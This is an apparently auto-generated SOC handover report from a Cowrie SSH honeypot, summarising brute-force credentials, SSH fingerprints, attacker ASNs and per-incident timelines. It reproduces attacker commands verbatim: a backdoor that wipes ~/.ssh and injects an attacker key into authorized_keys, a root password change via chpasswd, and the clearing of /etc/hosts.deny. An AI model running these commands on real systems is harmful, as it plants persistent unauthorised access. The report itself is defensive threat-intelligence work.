# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-06 |
| **Generated At** | 2026-04-06T07:52:12Z |
| **Shift Time** | 07:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **154** |
| Confirmed Threats | **150** |
| False Positives Filtered | **4** (2.6%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **9** |
| High Severity Cases | **48** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **106** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **113** |
| Unique Credential Pairs | **68** |
| Unique Usernames | **32** |
| Unique Passwords | **64** |
| Successful Auth Pairs | **31** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 48 |
| `345gs5662d34` | 24 |
| `ubuntu` | 8 |
| `postgres` | 3 |
| `testuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 23 |
| `123456` | 4 |
| `password` | 2 |
| `postgres28!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 23 |
| `postgres` | `postgres28!` | 1 |
| `git` | `git!2025` | 1 |
| `root` | `QweAsdZxc` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QweAsdZxc` | `36.255.3.203` | 2026-04-06T06:07:18 |
| `root` | `3245gs5662d34` | `36.255.3.203` | 2026-04-06T06:07:20 |
| `root` | `Ss123456` | `36.255.3.203` | 2026-04-06T06:11:33 |
| `root` | `Root123321@` | `36.255.3.203` | 2026-04-06T06:13:34 |
| `root` | `Root11111@123` | `36.255.3.203` | 2026-04-06T06:15:37 |
| `root` | `odoo12` | `138.84.53.142` | 2026-04-06T06:37:53 |
| `root` | `3245gs5662d34` | `138.84.53.142` | 2026-04-06T06:38:01 |
| `root` | `qwer123456!` | `138.84.53.142` | 2026-04-06T06:42:17 |
| `root` | `m123456789` | `120.62.8.17` | 2026-04-06T06:42:48 |
| `root` | `3245gs5662d34` | `120.62.8.17` | 2026-04-06T06:42:49 |
| `root` | `ZAQ!2wsx321!` | `138.84.53.142` | 2026-04-06T06:44:31 |
| `root` | `123123Aa` | `120.62.8.17` | 2026-04-06T06:45:53 |
| `root` | `root54321#$` | `120.62.8.17` | 2026-04-06T06:46:58 |
| `root` | `!@#123QWE` | `120.62.8.17` | 2026-04-06T06:49:08 |
| `root` | `qazwsx888@` | `138.84.53.142` | 2026-04-06T06:50:04 |
| `root` | `Aa111111!` | `120.62.8.17` | 2026-04-06T06:50:13 |
| `root` | `Yc@123456` | `138.84.53.142` | 2026-04-06T06:51:09 |
| `root` | `Abcd@123` | `138.84.53.142` | 2026-04-06T06:54:25 |
| `root` | `odoo123` | `120.62.8.17` | 2026-04-06T06:55:30 |
| `root` | `Aa@12345` | `120.62.8.17` | 2026-04-06T06:56:31 |
| `root` | `qazwsx123123@` | `120.62.8.17` | 2026-04-06T06:59:40 |
| `root` | `xxZZ1234` | `120.62.8.17` | 2026-04-06T07:00:44 |
| `root` | `root1234..` | `138.84.53.142` | 2026-04-06T07:01:11 |
| `root` | `Qazwsx2019!!` | `103.159.54.61` | 2026-04-06T07:43:09 |
| `root` | `3245gs5662d34` | `103.159.54.61` | 2026-04-06T07:43:13 |
| `root` | `#EDC4rfv` | `135.235.138.43` | 2026-04-06T07:43:56 |
| `root` | `3245gs5662d34` | `135.235.138.43` | 2026-04-06T07:43:57 |
| `root` | `Root1111#$` | `14.103.118.248` | 2026-04-06T07:46:11 |
| `root` | `@wsx3edc` | `103.101.197.221` | 2026-04-06T07:46:20 |
| `root` | `3245gs5662d34` | `103.101.197.221` | 2026-04-06T07:46:22 |
| `root` | `Root2020!@` | `203.83.231.93` | 2026-04-06T07:47:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **154** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 139 |
| OpenSSH | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 134 | 14 |
| `acaa53e0a7d7...` | Mirai/variant | 2 | 2 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 134 | 14 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `acaa53e0a7d7...` | OpenSSH | 2 | 2 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:f6E5NewRSyFB"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.118.248`, `203.83.231.93`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `135.235.138.43`, `36.255.3.203`, `103.101.197.221`, `138.84.53.142`, `120.62.8.17`, `103.159.54.61`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **20** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS63526` | Systems Solutions & development Technologies Limited | 1 | LOW |
| `AS9829` | National Internet Backbone | 1 | HIGH |
| `AS17665` | ONEOTT INTERTAINMENT LIMITED | 1 | HIGH |
| `AS134768` | CHINANET SHAANXI province Cloud Base network | 1 | HIGH |
| `AS10054` | CMB Kwangju Broadcasting | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (46)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9c9a65f4eb00

| Field | Detail |
|---|---|
| **Source IP** | `36.255.3[.]203` |
| **First Seen** | 2026-04-06 06:07 |
| **Last Seen** | 2026-04-06 06:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:07:18` | `cowrie.session.connect` |
| `2026-04-06 06:07:18` | `cowrie.client.version` |
| `2026-04-06 06:07:18` | `cowrie.client.kex` |
| `2026-04-06 06:07:18` | `cowrie.login.success` |
| `2026-04-06 06:07:18` | `cowrie.session.params` |
| `2026-04-06 06:07:18` | `cowrie.command.input` |
| `2026-04-06 06:07:18` | `cowrie.command.failed` |
| `2026-04-06 06:07:18` | `cowrie.log.closed` |
| `2026-04-06 06:07:18` | `cowrie.session.params` |
| `2026-04-06 06:07:18` | `cowrie.command.input` |
| `2026-04-06 06:07:18` | `cowrie.session.file_download` |
| `2026-04-06 06:07:18` | `cowrie.log.closed` |
| `2026-04-06 06:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.3[.]203` to AbuseIPDB if not already reported
- [ ] Block `36.255.3[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-352f273f13fb

| Field | Detail |
|---|---|
| **Source IP** | `36.255.3[.]203` |
| **First Seen** | 2026-04-06 06:07 |
| **Last Seen** | 2026-04-06 06:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:07:20` | `cowrie.session.connect` |
| `2026-04-06 06:07:20` | `cowrie.client.version` |
| `2026-04-06 06:07:20` | `cowrie.client.kex` |
| `2026-04-06 06:07:20` | `cowrie.login.success` |
| `2026-04-06 06:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.3[.]203` to AbuseIPDB if not already reported
- [ ] Block `36.255.3[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f73b278ede7b

| Field | Detail |
|---|---|
| **Source IP** | `36.255.3[.]203` |
| **First Seen** | 2026-04-06 06:11 |
| **Last Seen** | 2026-04-06 06:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:11:33` | `cowrie.session.connect` |
| `2026-04-06 06:11:33` | `cowrie.client.version` |
| `2026-04-06 06:11:33` | `cowrie.client.kex` |
| `2026-04-06 06:11:33` | `cowrie.login.success` |
| `2026-04-06 06:11:33` | `cowrie.session.params` |
| `2026-04-06 06:11:33` | `cowrie.command.input` |
| `2026-04-06 06:11:33` | `cowrie.command.failed` |
| `2026-04-06 06:11:33` | `cowrie.log.closed` |
| `2026-04-06 06:11:33` | `cowrie.session.params` |
| `2026-04-06 06:11:33` | `cowrie.command.input` |
| `2026-04-06 06:11:33` | `cowrie.session.file_download` |
| `2026-04-06 06:11:33` | `cowrie.log.closed` |
| `2026-04-06 06:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.3[.]203` to AbuseIPDB if not already reported
- [ ] Block `36.255.3[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a41910a7e59f

| Field | Detail |
|---|---|
| **Source IP** | `36.255.3[.]203` |
| **First Seen** | 2026-04-06 06:11 |
| **Last Seen** | 2026-04-06 06:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:11:34` | `cowrie.session.connect` |
| `2026-04-06 06:11:34` | `cowrie.client.version` |
| `2026-04-06 06:11:34` | `cowrie.client.kex` |
| `2026-04-06 06:11:35` | `cowrie.login.success` |
| `2026-04-06 06:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.3[.]203` to AbuseIPDB if not already reported
- [ ] Block `36.255.3[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67eff9b01331

| Field | Detail |
|---|---|
| **Source IP** | `36.255.3[.]203` |
| **First Seen** | 2026-04-06 06:13 |
| **Last Seen** | 2026-04-06 06:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:13:34` | `cowrie.session.connect` |
| `2026-04-06 06:13:34` | `cowrie.client.version` |
| `2026-04-06 06:13:34` | `cowrie.client.kex` |
| `2026-04-06 06:13:34` | `cowrie.login.success` |
| `2026-04-06 06:13:34` | `cowrie.session.params` |
| `2026-04-06 06:13:34` | `cowrie.command.input` |
| `2026-04-06 06:13:34` | `cowrie.command.failed` |
| `2026-04-06 06:13:34` | `cowrie.log.closed` |
| `2026-04-06 06:13:34` | `cowrie.session.params` |
| `2026-04-06 06:13:34` | `cowrie.command.input` |
| `2026-04-06 06:13:34` | `cowrie.session.file_download` |
| `2026-04-06 06:13:34` | `cowrie.log.closed` |
| `2026-04-06 06:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.3[.]203` to AbuseIPDB if not already reported
- [ ] Block `36.255.3[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7d2fea6fa8d

| Field | Detail |
|---|---|
| **Source IP** | `36.255.3[.]203` |
| **First Seen** | 2026-04-06 06:13 |
| **Last Seen** | 2026-04-06 06:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:13:35` | `cowrie.session.connect` |
| `2026-04-06 06:13:35` | `cowrie.client.version` |
| `2026-04-06 06:13:35` | `cowrie.client.kex` |
| `2026-04-06 06:13:36` | `cowrie.login.success` |
| `2026-04-06 06:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.3[.]203` to AbuseIPDB if not already reported
- [ ] Block `36.255.3[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962541f67537

| Field | Detail |
|---|---|
| **Source IP** | `36.255.3[.]203` |
| **First Seen** | 2026-04-06 06:15 |
| **Last Seen** | 2026-04-06 06:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:15:37` | `cowrie.session.connect` |
| `2026-04-06 06:15:37` | `cowrie.client.version` |
| `2026-04-06 06:15:37` | `cowrie.client.kex` |
| `2026-04-06 06:15:37` | `cowrie.login.success` |
| `2026-04-06 06:15:37` | `cowrie.session.params` |
| `2026-04-06 06:15:37` | `cowrie.command.input` |
| `2026-04-06 06:15:37` | `cowrie.command.failed` |
| `2026-04-06 06:15:37` | `cowrie.log.closed` |
| `2026-04-06 06:15:37` | `cowrie.session.params` |
| `2026-04-06 06:15:37` | `cowrie.command.input` |
| `2026-04-06 06:15:37` | `cowrie.session.file_download` |
| `2026-04-06 06:15:37` | `cowrie.log.closed` |
| `2026-04-06 06:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.3[.]203` to AbuseIPDB if not already reported
- [ ] Block `36.255.3[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1179f19ac17b

| Field | Detail |
|---|---|
| **Source IP** | `36.255.3[.]203` |
| **First Seen** | 2026-04-06 06:15 |
| **Last Seen** | 2026-04-06 06:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:15:38` | `cowrie.session.connect` |
| `2026-04-06 06:15:38` | `cowrie.client.version` |
| `2026-04-06 06:15:38` | `cowrie.client.kex` |
| `2026-04-06 06:15:39` | `cowrie.login.success` |
| `2026-04-06 06:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.255.3[.]203` to AbuseIPDB if not already reported
- [ ] Block `36.255.3[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4da62469ac4

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:37 |
| **Last Seen** | 2026-04-06 06:42 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:37:52` | `cowrie.session.connect` |
| `2026-04-06 06:37:52` | `cowrie.client.version` |
| `2026-04-06 06:37:52` | `cowrie.client.kex` |
| `2026-04-06 06:37:53` | `cowrie.login.success` |
| `2026-04-06 06:37:54` | `cowrie.session.params` |
| `2026-04-06 06:37:54` | `cowrie.command.input` |
| `2026-04-06 06:37:54` | `cowrie.command.failed` |
| `2026-04-06 06:37:54` | `cowrie.log.closed` |
| `2026-04-06 06:37:55` | `cowrie.session.params` |
| `2026-04-06 06:37:55` | `cowrie.command.input` |
| `2026-04-06 06:37:55` | `cowrie.session.file_download` |
| `2026-04-06 06:37:55` | `cowrie.log.closed` |
| `2026-04-06 06:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfbb4bfa13ea

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:37 |
| **Last Seen** | 2026-04-06 06:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:37:59` | `cowrie.session.connect` |
| `2026-04-06 06:37:59` | `cowrie.client.version` |
| `2026-04-06 06:37:59` | `cowrie.client.kex` |
| `2026-04-06 06:38:01` | `cowrie.login.success` |
| `2026-04-06 06:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104cf2621fe2

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:42 |
| **Last Seen** | 2026-04-06 06:47 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:42:15` | `cowrie.session.connect` |
| `2026-04-06 06:42:15` | `cowrie.client.version` |
| `2026-04-06 06:42:16` | `cowrie.client.kex` |
| `2026-04-06 06:42:17` | `cowrie.login.success` |
| `2026-04-06 06:42:18` | `cowrie.session.params` |
| `2026-04-06 06:42:18` | `cowrie.command.input` |
| `2026-04-06 06:42:18` | `cowrie.command.failed` |
| `2026-04-06 06:42:18` | `cowrie.log.closed` |
| `2026-04-06 06:42:19` | `cowrie.session.params` |
| `2026-04-06 06:42:19` | `cowrie.command.input` |
| `2026-04-06 06:42:19` | `cowrie.session.file_download` |
| `2026-04-06 06:42:19` | `cowrie.log.closed` |
| `2026-04-06 06:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f64400cbc8b

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:42 |
| **Last Seen** | 2026-04-06 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |
